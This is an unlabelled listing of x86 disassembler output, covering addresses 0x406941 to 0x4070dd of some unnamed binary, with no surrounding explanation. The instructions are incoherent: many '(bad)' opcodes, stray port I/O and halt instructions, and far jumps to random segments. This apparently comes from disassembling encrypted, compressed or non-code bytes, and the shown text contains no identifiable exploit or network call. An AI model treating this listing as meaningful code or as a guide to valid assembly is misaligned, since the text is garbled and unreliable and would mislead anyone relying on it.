  406941:	test   DWORD PTR [edi],0x14d82abe
  406947:	inc    edx
  406948:	mov    ss,ebp
  40694a:	push   esi
  40694b:	out    dx,al
  40694c:	mov    bl,0xcc
  40694e:	xor    eax,0xd025c1b4
  406953:	enter  0xc3f4,0x63
  406957:	cmp    esp,esi
  406959:	cmp    BYTE PTR [edx-0x14357c02],0x19
  406960:	adc    DWORD PTR [edi+0x68],esi
  406963:	push   esp
  406964:	and    esi,DWORD PTR [ebp+0x2ec8fed5]
  40696a:	scas   al,BYTE PTR es:[edi]
  40696b:	fcom   st(7)
  40696d:	mov    es,WORD PTR [ebx]
  40696f:	cmp    edi,DWORD PTR [ecx]
  406971:	sbb    al,0x1e
  406973:	push   0x296a392e
  406978:	push   esi
  406979:	add    BYTE PTR [ecx],al
  40697b:	in     eax,dx
  40697c:	xor    ah,BYTE PTR [ebp-0x6b3efecb]
  406982:	xchg   ecx,ecx
  406984:	mov    al,0xb9
  406986:	fimul  WORD PTR [ebp-0x42]
  406989:	push   esp
  40698a:	adc    DWORD PTR [edx-0x330f0a06],0x160f0fd6
  406994:	push   ebx
  406995:	scas   al,BYTE PTR es:[edi]
  406996:	mov    bh,0x5
  406998:	jbe    0x4069ca
  40699a:	(bad)  
  40699b:	ret    
  40699c:	push   eax
  40699d:	int3   
  40699e:	scas   eax,DWORD PTR es:[edi]
  40699f:	xor    DWORD PTR [ecx-0x64ae52b3],ecx
  4069a5:	jge    0x406988
  4069a7:	mov    ebp,0xad41751f
  4069ac:	jae    0x4069c6
  4069ae:	daa    
  4069af:	shl    BYTE PTR [eax],1
  4069b1:	lea    esi,[edi]
  4069b3:	and    al,0x75
  4069b5:	mov    ebx,0x377775f
  4069ba:	call   0x3dcc:0x38e507c0
  4069c1:	in     eax,0xad
  4069c3:	int3   
  4069c4:	push   ds
  4069c5:	stc    
  4069c6:	js     0x40695e
  4069c8:	mov    eax,0x919a5d1d
  4069cd:	mov    dl,0xdd
  4069cf:	ror    BYTE PTR [ebp-0x7c],0x88
  4069d3:	jne    0x40695d
  4069d5:	push   eax
  4069d6:	loopne 0x406a2b
  4069d8:	and    dl,BYTE PTR ds:0x794513fe
  4069de:	mov    ebp,0xce540783
  4069e3:	ja     0x406a1d
  4069e5:	inc    edi
  4069e6:	jg     0x4069db
  4069e8:	clc    
  4069e9:	cli    
  4069ea:	mov    ds:0x4c513c35,eax
  4069ef:	add    ch,cl
  4069f1:	jo     0x406a07
  4069f3:	enter  0x14a7,0x9
  4069f7:	xchg   DWORD PTR [edi+eiz*8],ebp
  4069fa:	fisttp WORD PTR [ebp+0x511fc6b8]
  406a00:	and    cl,bl
  406a02:	shr    BYTE PTR [edi-0x8],0x25
  406a06:	aaa    
  406a07:	xchg   BYTE PTR ds:0xc6d93e0b,cl
  406a0d:	scas   al,BYTE PTR es:[edi]
  406a0e:	sbb    eax,0xfece67e7
  406a13:	pop    eax
  406a14:	sbb    eax,0x8a99fa8
  406a19:	jle    0x4069fb
  406a1b:	lea    ebx,[ecx+0x1fcaa8ab]
  406a21:	inc    edx
  406a22:	xor    al,0xd7
  406a24:	mov    eax,ds:0x113a3cab
  406a29:	or     al,0x57
  406a2b:	retf   0x134b
  406a2e:	test   al,0x6
  406a30:	xchg   edi,eax
  406a31:	mov    cl,0x58
  406a33:	out    dx,eax
  406a34:	pop    ss
  406a35:	pop    esp
  406a36:	gs mov dl,0xc7
  406a39:	xlat   BYTE PTR ds:[ebx]
  406a3a:	sbb    bh,BYTE PTR [esi+ebx*4]
  406a3d:	mov    ebp,esi
  406a3f:	test   al,0xd7
  406a41:	popa   
  406a42:	ret    0x342f
  406a45:	out    dx,eax
  406a46:	pop    esp
  406a47:	or     al,0x8c
  406a49:	mov    dh,0xf4
  406a4b:	jp     0x406ab9
  406a4d:	cmp    dh,dl
  406a4f:	xchg   esp,eax
  406a50:	outs   dx,DWORD PTR ds:[esi]
  406a51:	or     al,0xd5
  406a53:	jbe    0x406acd
  406a55:	loop   0x406a1d
  406a57:	out    dx,eax
  406a58:	rol    BYTE PTR [ebp+0x2a],cl
  406a5b:	stos   BYTE PTR es:[edi],al
  406a5c:	jp     0x406ab3
  406a5e:	mov    ds:0x71706fec,eax
  406a63:	dec    edx
  406a64:	mov    ds:0x39d6c40b,eax
  406a69:	sub    BYTE PTR [eax-0x760f3e9c],bl
  406a6f:	mov    esi,0x8cc64915
  406a74:	(bad)  
  406a75:	test   al,0x10
  406a77:	addr16 mov ebx,0xbda16f59
  406a7d:	lea    ecx,[esi+ebx*1+0x2a]
  406a81:	pop    ds
  406a82:	test   al,0x28
  406a84:	addr16 mov bl,0x55
  406a87:	mov    eax,eax
  406a89:	or     eax,0x2513f984
  406a8e:	imul   edx,DWORD PTR [ebp-0x58],0x8622a64a
  406a95:	and    DWORD PTR [edx+0x5092df04],eax
  406a9b:	pop    ds
  406a9c:	cdq    
  406a9d:	mov    ebp,0xc9e6673f
  406aa2:	dec    eax
  406aa3:	add    al,0x8a
  406aa5:	and    DWORD PTR [ebx-0xd],esp
  406aa8:	scas   eax,DWORD PTR es:[edi]
  406aa9:	in     al,0xcb
  406aab:	xor    DWORD PTR [edx-0x7b],ecx
  406aae:	inc    ecx
  406aaf:	or     ebp,eax
  406ab1:	inc    eax
  406ab2:	inc    ebp
  406ab3:	dec    edx
  406ab4:	xchg   ecx,eax
  406ab5:	push   es
  406ab6:	scas   al,BYTE PTR es:[edi]
  406ab7:	inc    eax
  406ab8:	in     eax,dx
  406ab9:	sub    ah,bl
  406abb:	nop
  406abc:	and    dh,BYTE PTR [ecx-0x77]
  406abf:	test   DWORD PTR [ebx],esi
  406ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac2:	jg     0x406a67
  406ac4:	(bad)  [ebx-0x16efdf5f]
  406aca:	retf   
  406acb:	mov    bh,0xf5
  406acd:	and    DWORD PTR [edx],0xffffffda
  406ad0:	call   0x330e:0x1b1ae6ab
  406ad7:	js     0x406aaa
  406ad9:	fcomp  QWORD PTR [ebp-0x600418d3]
  406adf:	and    al,0xac
  406ae1:	lods   eax,DWORD PTR ds:[esi]
  406ae2:	(bad)  
  406ae3:	sar    BYTE PTR [eax+eiz*4+0x4a],1
  406ae7:	sbb    esp,DWORD PTR [ecx+0x59ba16db]
  406aed:	jbe    0x406b1d
  406aef:	add    bh,BYTE PTR [ebx-0x47]
  406af2:	add    cl,bh
  406af4:	xor    eax,0xd011b777
  406af9:	aas    
  406afa:	shr    BYTE PTR [ebx-0x46c64365],1
  406b00:	xchg   cx,ax
  406b03:	imul   ebx,DWORD PTR [ecx-0x241a7545],0x68
  406b0a:	cmp    ecx,DWORD PTR [eax+eiz*2-0x46]
  406b0e:	retf   
  406b0f:	xchg   ecx,eax
  406b10:	push   edx
  406b11:	repnz pop es
  406b13:	pop    ss
  406b14:	sub    al,0x4c
  406b16:	repz lds ecx,FWORD PTR [ebp-0x512b0d10]
  406b1d:	cdq    
  406b1e:	add    ch,cl
  406b20:	enter  0xf1bd,0x4b
  406b24:	(bad)  
  406b25:	push   ss
  406b26:	stc    
  406b27:	int3   
  406b28:	pop    es
  406b29:	sbb    cl,BYTE PTR [edx-0x27]
  406b2c:	lods   eax,DWORD PTR ds:[esi]
  406b2d:	mov    bh,0xa4
  406b2f:	adc    dl,ch
  406b31:	clc    
  406b32:	(bad)  
  406b33:	fnstenv [ebx]
  406b35:	pop    ecx
  406b36:	inc    eax
  406b37:	xchg   BYTE PTR [ecx],bh
  406b39:	adc    bl,BYTE PTR [ecx]
  406b3b:	jmp    0x406b11
  406b3d:	in     eax,0x20
  406b3f:	lahf   
  406b40:	sub    eax,0x617c9a0f
  406b45:	(bad)  
  406b46:	std    
  406b47:	jecxz  0x406af7
  406b49:	cmp    cl,0x62
  406b4c:	jmp    0x38c0:0x59bbb1e3
  406b53:	xchg   edi,ebx
  406b55:	mov    ch,0xe2
  406b57:	repz sbb eax,0x12859714
  406b5d:	in     al,dx
  406b5e:	add    eax,0x8a2ac668
  406b63:	add    DWORD PTR fs:[esi+0xb11ed31],edi
  406b6a:	das    
  406b6b:	add    eax,DWORD PTR [edi+esi*1]
  406b6e:	xor    dh,BYTE PTR [eax+0x2dc263f2]
  406b74:	in     al,dx
  406b75:	dec    ebp
  406b76:	xor    dh,BYTE PTR [ebx]
  406b78:	or     eax,0x2a
  406b7b:	pop    ss
  406b7c:	inc    eax
  406b7d:	pop    ebp
  406b7e:	xor    BYTE PTR [ebp-0x3d0431e7],ch
  406b84:	dec    ebx
  406b85:	and    edx,DWORD PTR [ebp+eiz*8+0x7c860fea]
  406b8c:	pop    esi
  406b8d:	(bad)  
  406b8e:	cmp    al,0x56
  406b90:	(bad)  
  406b91:	dec    esp
  406b92:	push   0xe
  406b94:	call   0xdec0c5d
  406b99:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  406b9b:	(bad)  
  406b9c:	repnz xor eax,0xefbb13bc
  406ba2:	xor    ebx,edx
  406ba4:	ja     0x406b62
  406ba6:	sbb    DWORD PTR [ebp-0x7b],ecx
  406ba9:	cdq    
  406baa:	ins    BYTE PTR es:[edi],dx
  406bab:	cli    
  406bac:	mov    al,ds:0xc0fb264a
  406bb1:	mov    eax,0x366bcfaf
  406bb6:	dec    ecx
  406bb7:	and    BYTE PTR [ecx],dl
  406bb9:	fdivr  QWORD PTR [eax]
  406bbb:	dec    edx
  406bbc:	fmul   DWORD PTR [eax-0x556ffedc]
  406bc2:	imul   ecx,DWORD PTR [ecx-0x1f],0xeb1b3134
  406bc9:	or     esp,eax
  406bcb:	in     eax,0x8
  406bcd:	ja     0x406c43
  406bcf:	sub    eax,0xcefa94ea
  406bd4:	pushf  
  406bd5:	pop    edi
  406bd6:	cld    
  406bd7:	imul   ebx,DWORD PTR fs:[edx-0x28],0x1902b69b
  406bdf:	out    0x53,eax
  406be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406be2:	in     al,0x67
  406be4:	jge    0x406bb1
  406be6:	rcl    DWORD PTR [edx],0xc8
  406be9:	stos   DWORD PTR es:[edi],eax
  406bea:	fld    TBYTE PTR [edx]
  406bec:	std    
  406bed:	out    dx,al
  406bee:	gs pop edi
  406bf0:	clc    
  406bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bf2:	inc    edi
  406bf3:	das    
  406bf4:	sub    DWORD PTR [eax-0xd],esi
  406bf7:	not    BYTE PTR [ecx]
  406bf9:	mov    esp,DWORD PTR [ebp-0x1d]
  406bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bfd:	pop    ebp
  406bfe:	sub    al,0x1
  406c00:	pop    edi
  406c01:	lahf   
  406c02:	ret    
  406c03:	cmp    edx,eax
  406c05:	dec    ebp
  406c06:	push   es
  406c07:	push   edx
  406c08:	pop    eax
  406c09:	and    eax,DWORD PTR [eax+0x38ba2a4f]
  406c0f:	sti    
  406c10:	add    al,0x5f
  406c12:	ja     0x406bc9
  406c14:	xchg   esi,eax
  406c15:	or     ebx,0xa2680f25
  406c1b:	pop    eax
  406c1c:	stos   DWORD PTR es:[edi],eax
  406c1d:	inc    ebp
  406c1e:	repz ss dec edx
  406c21:	cld    
  406c22:	mov    dh,0x6e
  406c24:	(bad)  
  406c26:	dec    esi
  406c27:	test   DWORD PTR [edx-0x36372e1f],ebx
  406c2d:	xor    ebp,esi
  406c2f:	loopne 0x406c75
  406c31:	sbb    eax,0x11a667e1
  406c36:	jmp    0xa8c2:0xfc1fb8db
  406c3d:	xor    al,0xb6
  406c3f:	in     al,dx
  406c40:	mov    bh,0x6c
  406c42:	test   eax,0x955162fb
  406c47:	aaa    
  406c48:	push   edx
  406c49:	push   ds
  406c4a:	std    
  406c4b:	lds    eax,FWORD PTR [edx+0x521d1fa3]
  406c51:	mov    fs,edi
  406c53:	push   ds
  406c54:	and    DWORD PTR [esi+0x69],edx
  406c57:	xchg   esi,eax
  406c58:	add    edx,eax
  406c5a:	in     al,0xa
  406c5c:	add    DWORD PTR [eax+0x60],ebp
  406c5f:	dec    ecx
  406c60:	mov    ch,0xf6
  406c62:	cmp    al,BYTE PTR [ecx]
  406c64:	push   cs
  406c65:	mov    dl,ch
  406c67:	ss mov ah,0xe
  406c6a:	shl    BYTE PTR [edx],0xd4
  406c6d:	mov    al,ds:0x919c2836
  406c72:	jl     0x406cd7
  406c74:	jge    0x406c5c
  406c76:	push   cs
  406c77:	cmp    dh,al
  406c79:	in     eax,0xb8
  406c7b:	retf   0x4ead
  406c7e:	xchg   ecx,eax
  406c7f:	mov    DWORD PTR [eax],0x10422cd6
  406c85:	inc    edx
  406c86:	mov    bh,0x7b
  406c88:	out    0xe2,al
  406c8a:	aaa    
  406c8b:	je     0x406cae
  406c8d:	test   ebp,0x8a9cf078
  406c93:	icebp  
  406c94:	shr    DWORD PTR [edi-0x11f00ae7],1
  406c9a:	cdq    
  406c9b:	into   
  406c9c:	push   ds
  406c9d:	shr    BYTE PTR [edx],cl
  406c9f:	add    al,0x7
  406ca1:	and    BYTE PTR [ecx+0x13],cl
  406ca4:	and    ebp,DWORD PTR [edi+0x42]
  406ca7:	test   BYTE PTR [ebx-0x26d27ffa],0x0
  406cae:	xchg   esp,eax
  406caf:	adc    al,0x29
  406cb1:	adc    BYTE PTR [ebx-0x50],ch
  406cb4:	or     DWORD PTR [edi+0x5a4b0484],esp
  406cba:	dec    esp
  406cbb:	xor    DWORD PTR [edi+0x64ee98d2],ecx
  406cc1:	stc    
  406cc2:	cmp    ebp,eax
  406cc4:	packsswb mm7,QWORD PTR [edi+0xe8d603]
  406ccb:	int    0xf4
  406ccd:	in     eax,dx
  406cce:	je     0x406c52
  406cd0:	xchg   ebp,eax
  406cd1:	sti    
  406cd2:	addr16 or al,0xd
  406cd5:	cmc    
  406cd6:	cmp    BYTE PTR [ebp-0x36],0xbd
  406cda:	dec    esp
  406cdb:	mov    dl,0xff
  406cdd:	imul   edi,DWORD PTR [esi],0x51a66d93
  406ce3:	repz add al,0xe0
  406ce6:	mov    eax,fs:0x53973d25
  406cec:	loope  0x406d53
  406cee:	inc    esi
  406cef:	push   ebp
  406cf0:	and    ebx,0x4dfb8f3f
  406cf6:	xor    bl,dh
  406cf8:	bound  ebp,QWORD PTR [edi-0x63]
  406cfb:	popa   
  406cfc:	dec    ebp
  406cfd:	push   esp
  406cfe:	cmp    eax,DWORD PTR [edx]
  406d00:	test   BYTE PTR [ecx+0x6a9bfeb1],bl
  406d06:	inc    esp
  406d07:	icebp  
  406d08:	or     al,0xc0
  406d0a:	jmp    0xb270218b
  406d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d10:	mov    edx,0x6c2103c
  406d15:	mov    dl,0xd9
  406d17:	xlat   BYTE PTR ds:[ebx]
  406d18:	jecxz  0x406d7e
  406d1a:	sub    al,BYTE PTR [esp+ebx*2]
  406d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d1e:	add    ah,BYTE PTR [esi]
  406d20:	xor    ebp,DWORD PTR [esp+eax*4+0x2fbffa3e]
  406d27:	adc    esp,ebp
  406d29:	pop    edx
  406d2a:	fwait
  406d2b:	in     al,dx
  406d2c:	or     al,0x5d
  406d2e:	sbb    eax,0xdccc5319
  406d33:	push   eax
  406d34:	mov    bh,0x18
  406d36:	jns    0x406d57
  406d38:	mov    DWORD PTR [ebp+0x646e17fe],edi
  406d3e:	fstp   TBYTE PTR [edi-0x12]
  406d41:	cmp    esi,DWORD PTR [ecx]
  406d43:	stc    
  406d44:	sar    BYTE PTR [eax-0x31],1
  406d47:	imul   DWORD PTR [ecx+0x38]
  406d4a:	hlt    
  406d4b:	in     eax,0x7
  406d4d:	fcomp  DWORD PTR [esi-0x1fb74e4e]
  406d53:	inc    ebx
  406d54:	adc    DWORD PTR [ebx+0x58],edi
  406d57:	hlt    
  406d58:	fidivr WORD PTR [esi-0x6fcb7ea]
  406d5e:	int3   
  406d5f:	dec    ebp
  406d60:	xchg   edx,eax
  406d61:	xor    esi,DWORD PTR [edi+0xee66c09]
  406d67:	outs   dx,DWORD PTR ds:[esi]
  406d68:	pop    ss
  406d69:	inc    ebx
  406d6a:	std    
  406d6b:	ja     0x406de7
  406d6d:	add    bh,cl
  406d6f:	inc    eax
  406d70:	jge    0x406dc2
  406d72:	scas   al,BYTE PTR es:[edi]
  406d73:	stos   DWORD PTR es:[edi],eax
  406d74:	xor    eax,ebx
  406d76:	sahf   
  406d77:	mov    eax,0x514131e6
  406d7c:	mov    eax,0xb794d2a5
  406d81:	push   cs
  406d82:	lods   al,BYTE PTR ds:[esi]
  406d83:	mov    ah,0xff
  406d85:	sbb    al,0x3d
  406d87:	enter  0x6006,0x86
  406d8b:	fwait
  406d8c:	adc    DWORD PTR [eax+edi*4],ebp
  406d8f:	cmp    DWORD PTR [ecx],0x37ee4ccc
  406d95:	int    0x26
  406d97:	es pop ecx
  406d99:	imul   BYTE PTR [eax]
  406d9b:	and    eax,0xb3c94572
  406da0:	mov    ecx,0xed4f247e
  406da5:	int    0xee
  406da7:	ret    0x3635
  406daa:	clc    
  406dab:	inc    ebx
  406dac:	cli    
  406dad:	mov    dh,0xee
  406daf:	clc    
  406db0:	out    dx,al
  406db1:	xchg   esp,eax
  406db2:	xchg   edx,eax
  406db3:	xor    DWORD PTR ds:0x9944a00,0x6f27ffd
  406dbd:	push   ds
  406dbe:	xlat   BYTE PTR ds:[ebx]
  406dbf:	cli    
  406dc0:	adc    DWORD PTR [edx+0x45],ebx
  406dc3:	cmc    
  406dc4:	aad    0x28
  406dc6:	fdiv   st(5),st
  406dc8:	and    al,0x7d
  406dca:	mov    BYTE PTR [edi-0x27953486],dh
  406dd0:	xchg   edi,eax
  406dd1:	mov    bl,0x9b
  406dd3:	push   ebp
  406dd4:	mov    ebx,0x9cac3c87
  406dd9:	xchg   esp,eax
  406dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ddb:	pushf  
  406ddc:	jo     0x406d9b
  406dde:	pop    ebp
  406ddf:	repnz das 
  406de1:	int3   
  406de2:	inc    edi
  406de3:	aad    0xd
  406de5:	gs cmp al,0xa4
  406de8:	jg     0x406e01
  406dea:	bound  ebx,QWORD PTR gs:[esi-0x31]
  406dee:	retf   0xa3f5
  406df1:	or     eax,0x8a27f9de
  406df6:	pop    edx
  406df7:	(bad)  [ecx+0x24]
  406dfa:	add    DWORD PTR [ecx+0x7c10abfc],edi
  406e00:	imul   ebx,DWORD PTR [esi+ebp*2+0x29078d4f],0x50
  406e08:	stos   BYTE PTR es:[edi],al
  406e09:	sub    BYTE PTR [esi],cl
  406e0b:	xchg   ecx,eax
  406e0c:	(bad)  
  406e0e:	cli    
  406e0f:	adc    al,0xff
  406e11:	adc    eax,0xaccc47d3
  406e16:	sbb    al,0xca
  406e18:	mov    esi,0x87bda278
  406e1d:	sbb    eax,0x5bd9bf7b
  406e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e23:	push   cs
  406e24:	dec    esi
  406e25:	daa    
  406e26:	and    BYTE PTR ss:[ebx+0x7e],bh
  406e2a:	inc    edi
  406e2b:	dec    esp
  406e2c:	leave  
  406e2d:	out    dx,eax
  406e2e:	push   eax
  406e2f:	ds inc eax
  406e31:	mov    cs,esi
  406e33:	mov    dl,0x72
  406e35:	loop   0x406e5b
  406e37:	dec    edx
  406e38:	mov    esp,0xa2693b74
  406e3d:	mov    BYTE PTR [edi],dl
  406e3f:	xor    DWORD PTR [edi+0x5670c194],ecx
  406e45:	retf   0x78c3
  406e48:	pop    ebx
  406e49:	lea    ebx,ds:0xe1496344
  406e4f:	adc    esi,DWORD PTR [esi-0x5a593773]
  406e55:	in     al,dx
  406e56:	(bad)  
  406e57:	(bad)  
  406e59:	fsubr  DWORD PTR [ebp-0x41]
  406e5c:	ds inc ebp
  406e5e:	mov    ds:0xf923e285,eax
  406e63:	mov    cl,0x2a
  406e65:	cmp    eax,0x4fc5f2b5
  406e6a:	cmp    bl,BYTE PTR [eax]
  406e6c:	mov    eax,ecx
  406e6e:	call   0xd8ed43
  406e73:	pop    ebp
  406e74:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406e76:	dec    esi
  406e77:	enter  0xa1fb,0x57
  406e7b:	add    bh,ch
  406e7d:	xchg   esi,ecx
  406e7f:	fnstcw WORD PTR [ecx+edi*2-0x3a]
  406e83:	(bad)  
  406e84:	ret    
  406e85:	push   0x29c876c2
  406e8a:	ds dec ecx
  406e8c:	sbb    ecx,DWORD PTR [eax-0x4cdde2de]
  406e92:	sbb    BYTE PTR [edi-0x2c],al
  406e95:	stos   DWORD PTR es:[edi],eax
  406e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e97:	push   es
  406e98:	push   ss
  406e99:	outs   dx,DWORD PTR ds:[esi]
  406e9a:	pop    ss
  406e9b:	or     BYTE PTR [ebx+ebp*8],dl
  406e9e:	fiadd  DWORD PTR [esi-0x18]
  406ea1:	push   cs
  406ea2:	push   0xffffffef
  406ea4:	xor    al,0x75
  406ea6:	(bad)  
  406ea7:	in     eax,0xfd
  406ea9:	sbb    DWORD PTR [ebx+0x59da3e55],ecx
  406eaf:	sbb    ah,BYTE PTR [eax+0x13]
  406eb2:	pop    edi
  406eb3:	callw  0xcd71
  406eb7:	rol    ebp,1
  406eb9:	(bad)  
  406eba:	hlt    
  406ebb:	sti    
  406ebc:	xor    al,0x97
  406ebe:	fisubr WORD PTR ds:0x8914c42a
  406ec4:	clc    
  406ec5:	cmc    
  406ec6:	add    DWORD PTR [edi+0xc02fd4b],edx
  406ecc:	bound  edx,QWORD PTR [esp+ebp*4]
  406ecf:	ret    0xbf6c
  406ed2:	inc    esp
  406ed3:	fcom   DWORD PTR [ecx+eax*8]
  406ed6:	sbb    al,0x16
  406ed8:	test   DWORD PTR [esi+0x3f],esp
  406edb:	cmp    DWORD PTR [eax],ebx
  406edd:	mov    al,dl
  406edf:	fwait
  406ee0:	jl     0x406f26
  406ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ee3:	fsubr  DWORD PTR [edx]
  406ee5:	push   0x7b56c0f9
  406eea:	std    
  406eeb:	and    al,0x57
  406eed:	inc    edi
  406eee:	fisttp QWORD PTR [esi-0x3a]
  406ef1:	sbb    eax,0xc9b77e6a
  406ef6:	inc    edx
  406ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef9:	div    al
  406efb:	pop    esp
  406efc:	mov    edx,ds
  406efe:	mov    ds:0x54b956e0,al
  406f03:	mov    esi,esp
  406f05:	cmp    DWORD PTR [eax],ebx
  406f07:	into   
  406f08:	mov    ecx,DWORD PTR [ebp+0x4b]
  406f0b:	adc    DWORD PTR [edi*4-0x10867b52],0xfffffff0
  406f13:	pop    edi
  406f14:	adc    bh,BYTE PTR [ebp-0xe75f35d]
  406f1a:	rcl    BYTE PTR [ebp-0x59],1
  406f1d:	add    eax,0xaea74b5a
  406f22:	out    dx,eax
  406f23:	sub    esi,DWORD PTR [edi]
  406f25:	cmp    ch,BYTE PTR [eax+0x5]
  406f28:	or     dl,al
  406f2a:	call   0x6e0a:0x1f519133
  406f31:	mov    ah,0x6a
  406f33:	hlt    
  406f34:	push   esp
  406f35:	and    DWORD PTR [edx+0x7d7cf73b],0xe868280d
  406f3f:	dec    eax
  406f40:	je     0x406ef4
  406f42:	and    ch,BYTE PTR [edx-0x3adf5e30]
  406f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f49:	daa    
  406f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4b:	dec    eax
  406f4c:	ss jmp 0x99a9e2bd
  406f52:	inc    esp
  406f53:	sbb    bh,0x1a
  406f56:	jecxz  0x406f1d
  406f58:	cld    
  406f59:	sbb    DWORD PTR [edi-0x170cb149],0x5d
  406f60:	and    edx,DWORD PTR [edi+0x8f779b4]
  406f66:	jg     0x406f6e
  406f68:	test   ebp,ebp
  406f6a:	and    DWORD PTR ds:0xababfd4b,edx
  406f70:	xchg   ebx,eax
  406f71:	int3   
  406f72:	pop    ebp
  406f73:	pop    esp
  406f74:	ins    BYTE PTR es:[edi],dx
  406f75:	mov    ebp,0xbddd7abc
  406f7a:	mov    ah,0x76
  406f7c:	mov    cs,WORD PTR [edi]
  406f7e:	or     al,0x18
  406f80:	pop    eax
  406f81:	enter  0x7caa,0x16
  406f85:	arpl   WORD PTR [eax+0x9],dx
  406f88:	or     eax,0xe23750c4
  406f8d:	(bad)  
  406f8e:	out    dx,eax
  406f8f:	dec    eax
  406f90:	lds    esp,FWORD PTR [eax-0x5c]
  406f93:	and    ch,al
  406f95:	js     0x406f38
  406f97:	add    al,0xb3
  406f99:	aad    0x3d
  406f9b:	call   0x27ed:0xc2806c97
  406fa2:	outs   dx,DWORD PTR ds:[esi]
  406fa3:	adc    edx,DWORD PTR [edi]
  406fa5:	jno    0x406fb6
  406fa7:	pop    edi
  406fa8:	aaa    
  406fa9:	xor    DWORD PTR [edi+0x57e6111f],0x8e987c89
  406fb3:	int3   
  406fb4:	int3   
  406fb5:	push   0x1556baf9
  406fba:	iret   
  406fbb:	popf   
  406fbc:	xchg   ecx,eax
  406fbd:	daa    
  406fbe:	out    0xad,al
  406fc0:	lahf   
  406fc1:	pop    ebp
  406fc2:	or     ebp,DWORD PTR [edi+0xc]
  406fc5:	dec    esi
  406fc6:	enter  0x1e29,0xf2
  406fca:	pop    eax
  406fcb:	adc    al,0x7b
  406fcd:	call   0x33bac59e
  406fd2:	out    0x4a,eax
  406fd4:	sub    al,0xcf
  406fd6:	lods   eax,DWORD PTR ds:[esi]
  406fd7:	cs scas al,BYTE PTR es:[edi]
  406fd9:	pop    ds
  406fda:	fiadd  WORD PTR [edi]
  406fdc:	jle    0x406fed
  406fde:	jmp    DWORD PTR [esi]
  406fe0:	cmp    BYTE PTR [edx],dl
  406fe2:	ins    BYTE PTR es:[edi],dx
  406fe3:	inc    edi
  406fe4:	jecxz  0x406fe8
  406fe6:	jo     0x406f98
  406fe8:	std    
  406fe9:	adc    BYTE PTR [ebx+0x31],bl
  406fec:	mov    ds:0x43f01a4b,eax
  406ff1:	push   0xffffffcf
  406ff3:	test   esi,ebx
  406ff5:	mov    WORD PTR [ecx+0x4fd89fca],?
  406ffb:	fist   WORD PTR [ebp-0x4dca306a]
  407001:	jne    0x407063
  407003:	jg     0x407071
  407005:	imul   ebp,DWORD PTR [edx],0xd130f518
  40700b:	jmp    0x407060
  40700d:	scas   eax,DWORD PTR es:[edi]
  40700e:	xor    edx,edx
  407010:	hlt    
  407011:	mov    dh,0x3c
  407013:	push   edx
  407014:	xor    dh,BYTE PTR [esi]
  407016:	es mov eax,0x2c7921d4
  40701c:	add    eax,0x40f7200
  407021:	shl    dh,0x2f
  407024:	fidiv  WORD PTR [eax]
  407026:	imul   ebp,DWORD PTR [edx+0x16],0xa913532f
  40702d:	loop   0x406fc3
  40702f:	xchg   esi,eax
  407030:	les    edi,FWORD PTR [esp+ebx*4+0x2b]
  407034:	xor    ecx,DWORD PTR [edx]
  407036:	in     eax,dx
  407037:	pop    esi
  407038:	and    eax,0xd89010cf
  40703d:	cld    
  40703e:	cmp    ch,BYTE PTR [edi-0x3f]
  407041:	outs   dx,BYTE PTR ds:[esi]
  407042:	call   0x653a:0x41e292bb
  407049:	enter  0x348b,0xea
  40704d:	push   ecx
  40704e:	cdq    
  40704f:	jno    0x407080
  407051:	test   BYTE PTR [ecx],al
  407053:	mov    eax,0x6be6d98c
  407058:	jle    0x40701d
  40705a:	lahf   
  40705b:	push   esi
  40705c:	clc    
  40705d:	add    al,0x75
  40705f:	xor    cl,BYTE PTR [esi]
  407061:	mov    ds:0xc9cc0953,eax
  407066:	push   ds
  407067:	xor    BYTE PTR [ecx],0xdd
  40706a:	dec    ebx
  40706b:	push   edi
  40706c:	(bad)  
  40706d:	out    dx,al
  40706e:	cmp    al,bh
  407070:	aam    0x1e
  407072:	test   DWORD PTR [ebp+0x761aa1ed],0x6b8c2848
  40707c:	jge    0x4070c7
  40707e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40707f:	jns    0x407063
  407081:	sub    dl,BYTE PTR [ebx]
  407083:	jle    0x407042
  407085:	push   cs
  407086:	push   ds
  407087:	data16 jecxz 0x4070fb
  40708a:	or     BYTE PTR [ebp-0x23543a11],dh
  407090:	add    al,0xfc
  407092:	mov    cl,0x87
  407094:	int3   
  407095:	jg     0x40703e
  407097:	iretw  
  407099:	fwait
  40709a:	sub    BYTE PTR [ebp-0x2cb58d46],0xf7
  4070a1:	jmp    0x8ce6:0x32089a25
  4070a8:	mov    eax,0x8aa0dc66
  4070ad:	push   eax
  4070ae:	ins    BYTE PTR es:[edi],dx
  4070af:	dec    esp
  4070b0:	lea    ecx,[ecx+0x2af6eff0]
  4070b6:	push   0x7d57f2f8
  4070bb:	add    BYTE PTR [eax+0xb],ah
  4070be:	lods   al,BYTE PTR fs:[esi]
  4070c0:	mov    ch,0x2d
  4070c2:	scas   al,BYTE PTR es:[edi]
  4070c3:	mov    esp,DWORD PTR [edx]
  4070c5:	cmc    
  4070c6:	inc    ebx
  4070c7:	jp     0x40710e
  4070c9:	cmp    al,0x8f
  4070cb:	xchg   DWORD PTR [ebx-0x75647e1f],esi
  4070d1:	test   eax,0x8d9cbb7d
  4070d6:	pop    esp
  4070d7:	loopne 0x4070e5
  4070d9:	clc    
  4070da:	scas   eax,DWORD PTR es:[edi]
  4070db:	and    al,dh
  4070dd:	lea    eax,[ecx+ebp*8]
